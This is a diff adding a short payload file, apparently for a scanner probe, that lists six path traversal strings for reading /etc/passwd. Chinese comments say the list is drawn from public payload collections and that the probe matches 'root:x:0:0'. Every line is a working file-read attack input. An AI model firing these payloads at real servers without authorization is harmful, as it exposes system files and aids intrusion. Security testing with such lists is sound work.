@@ -1,0 +1,8 @@
+# 路径穿越载荷（读 /etc/passwd）。无占位符；探针走回显通道，匹配特征串 root:x:0:0
+# 精选自 PayloadsAllTheThings/SecLists，仅留 Linux、原始字符，另留 1 条 URL 编码变体垫底
+../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+/etc/passwd
+....//....//....//....//etc/passwd
+../../../../etc/passwd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
